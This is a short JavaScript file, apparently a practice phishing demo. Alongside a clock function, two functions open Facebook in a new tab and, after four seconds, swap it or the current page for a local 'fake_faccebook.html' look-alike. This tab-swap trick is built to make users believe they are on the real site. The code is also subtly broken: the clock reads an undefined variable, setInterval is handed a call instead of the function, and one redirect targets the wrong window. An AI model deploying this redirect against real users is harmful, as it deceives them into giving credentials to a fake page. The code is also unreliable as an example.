function updateTime() {
  const d = new Date();
  const timestring = now.toLocaleTimeString();
  const timeElement = document.getElementById("time");
  timeElement.textContent = timestring;
}
setInterval(updateTime(), 1000);

function GoToFacebook() {
  const windowObj = window.open("https://Facebook.com", "_blank");
  setTimeout(() => {
    windowObj.location.replace("http://127.0.0.1:5500/fake_faccebook.html");
  }, 4000);
}

function changePage() {
  const windowObj = window.open("https://Facebook.com", "_blank");
  setTimeout(() => {
    location.replace("http://127.0.0.1:5500/fake_faccebook.html");
  }, 4000);
}
